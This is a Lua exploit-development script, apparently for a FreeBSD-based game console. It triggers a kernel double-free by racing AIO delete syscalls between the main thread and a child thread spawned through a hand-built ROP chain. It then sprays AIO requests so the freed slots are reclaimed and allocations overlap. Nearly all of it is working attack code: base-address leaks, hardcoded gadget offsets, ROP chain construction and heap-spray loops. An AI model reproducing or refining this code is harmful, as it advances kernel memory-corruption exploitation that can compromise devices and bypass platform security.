-- CRASH_CLASS: HIGH
-- PROBE 65u: AIO double-free — main thread participates in race
--
-- 65s/65t: doubles confirmed but no observable overlap. Diagnosis:
-- frees happen on CHILD CPUs, spray allocs on MAIN thread CPU →
-- different UMA per-CPU caches → no reclaim of double-freed slots.
--
-- Fix: main thread calls 662 CONCURRENTLY with a child. Both race
-- on the same IDs. Main thread's frees go to main thread's cache.
-- Subsequent main thread AIO submits reclaim from same cache →
-- guaranteed same-bucket overlap.

print("=== PROBE 65u: main-thread race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x1000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

if not alive() then print("DEAD after setup"); return end

-- =========================================================
-- [A] Main thread + 1 child race on same IDs
--     Main thread calls 662 right after spawning child
-- =========================================================
print("")
print("[A] Main-thread race — spawn child then immediately call 662")

local BATCH = 32
local ITERS = 15
local total_doubles = 0
local total_main_ok = 0
local total_child_ok = 0

local del_ids  = memory.alloc(4 * BATCH + 0x10)
local stChild  = memory.alloc(4 * BATCH + 0x10)
local stMain   = memory.alloc(4 * BATCH + 0x10)
local markerC  = memory.alloc(8)

for iter = 1, ITERS do
    if not alive() then print("  iter " .. iter .. ": DEAD"); break end

    -- Submit + poll victims
    local vids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 8 then
        print(string.format("  iter %d: only %d victims", iter, vc))
        break
    end

    -- Write shared ID array
    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    -- Build child ROP chain: marker → 662 → marker → exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)

    -- Spawn child and IMMEDIATELY race from main thread
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- Main thread calls 662 on the SAME IDs — racing with child!
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)

    -- Wait for child to finish
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local mC = N(rq(N(markerC)) or uint64(0))

    -- Count results
    local doubles = 0
    local main_ok = 0
    local child_ok = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 then main_ok = main_ok + 1 end
        if sC == 0 then child_ok = child_ok + 1 end
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles
    total_main_ok = total_main_ok + main_ok
    total_child_ok = total_child_ok + child_ok

    if not alive() then
        print(string.format("  iter %d: dbl=%d main=%d child=%d → DEAD",
            iter, doubles, main_ok, child_ok))
        break
    end

    -- IMMEDIATELY submit spray — main thread's cache has the freed items
    local spray = {}
    for i = 1, BATCH * 2 do
        local id = submit_one()
        if id ~= 0 then table.insert(spray, id) end
    end
    for _, id in ipairs(spray) do poll_one(id) end

    if not alive() then
        print(string.format("  iter %d: dbl=%d spray=%d → DEAD after poll",
            iter, doubles, #spray))
        break
    end

    -- Delete spray one by one — watch for crashes
    local spray_ok = 0
    local spray_fail = 0
    for _, id in ipairs(spray) do
        if not alive() then spray_fail = spray_fail + 1; break end
        wd(N(one_id), id); wd(N(one_st), 0xDEAD)
        pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local st = rd(N(one_st)) or 0xDEAD
        if st == 0 then spray_ok = spray_ok + 1
        else spray_fail = spray_fail + 1 end
    end

    if doubles > 0 or spray_fail > 0 or iter <= 3 or iter == ITERS then
        print(string.format(
            "  iter %d: dbl=%d main=%d child=%d spray=%d/%d fail=%d mC=0x%X",
            iter, doubles, main_ok, child_ok, spray_ok, #spray, spray_fail, mC))
    end

    if not alive() then break end
end

print(string.format("  TOTAL: dbl=%d main=%d child=%d",
    total_doubles, total_main_ok, total_child_ok))

if not alive() then
    print("")
    print("[B] SKIPPED — dead")
    print("=== PROBE 65u COMPLETE ===")
    return
end

-- =========================================================
-- [B] Two-batch overlap with main-thread racing
-- =========================================================
print("")
print("[B] Two-batch overlap — main thread races, then 2 spray batches")

for trial = 1, 10 do
    if not alive() then print("  trial " .. trial .. ": DEAD"); break end

    -- Submit + poll victims
    local vids = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 8 then break end

    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
    wq(N(par) + 0x30, tid_p)

    -- Race!
    pcall(function() mk(455)(par, uint64(0x38)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d → DEAD", trial, doubles))
        break
    end

    -- Spray batch 1 — should reclaim first copy from main thread's cache
    local b1 = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then table.insert(b1, id) end
    end
    for _, id in ipairs(b1) do poll_one(id) end

    -- Spray batch 2 — should reclaim second copy → OVERLAP
    local b2 = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then table.insert(b2, id) end
    end
    for _, id in ipairs(b2) do poll_one(id) end

    if not alive() then
        print(string.format("  trial %d: dbl=%d b1=%d b2=%d → DEAD after spray",
            trial, doubles, #b1, #b2))
        break
    end

    -- Delete b1
    local b1_buf = memory.alloc(4 * #b1)
    local b1_st  = memory.alloc(4 * #b1)
    for i = 0, #b1 - 1 do
        wd(N(b1_buf) + i * 4, b1[i + 1])
        wd(N(b1_st) + i * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(b1_buf)), uint64(#b1), uint64(N(b1_st)))
    end)
    local b1_ok = 0
    for i = 0, #b1 - 1 do
        if rd(N(b1_st) + i * 4) == 0 then b1_ok = b1_ok + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d b1_del=%d/%d → DEAD (b1 freed b2!)",
            trial, doubles, b1_ok, #b1))
        break
    end

    -- Delete b2 — if overlapping, this hits freed memory
    local b2_buf = memory.alloc(4 * #b2)
    local b2_st  = memory.alloc(4 * #b2)
    for i = 0, #b2 - 1 do
        wd(N(b2_buf) + i * 4, b2[i + 1])
        wd(N(b2_st) + i * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(b2_buf)), uint64(#b2), uint64(N(b2_st)))
    end)
    local b2_ok = 0
    local b2_unk = 0
    for i = 0, #b2 - 1 do
        local st = rd(N(b2_st) + i * 4) or 0xDEAD
        if st == 0 then b2_ok = b2_ok + 1
        elseif st ~= 0x80020003 and st ~= 0xDEAD then b2_unk = b2_unk + 1 end
    end

    if not alive() then
        print(string.format(
            "  trial %d: dbl=%d b1=%d/%d b2=%d/%d unk=%d → DEAD (cascade!)",
            trial, doubles, b1_ok, #b1, b2_ok, #b2, b2_unk))
        break
    end

    if doubles > 0 or b2_unk > 0 or trial <= 3 or trial == 10 then
        print(string.format("  trial %d: dbl=%d b1=%d/%d b2=%d/%d unk=%d",
            trial, doubles, b1_ok, #b1, b2_ok, #b2, b2_unk))
    end
end

print("")
print(string.format("FINAL: alive=%s", alive() and "YES" or "NO"))
print("=== PROBE 65u COMPLETE ===")
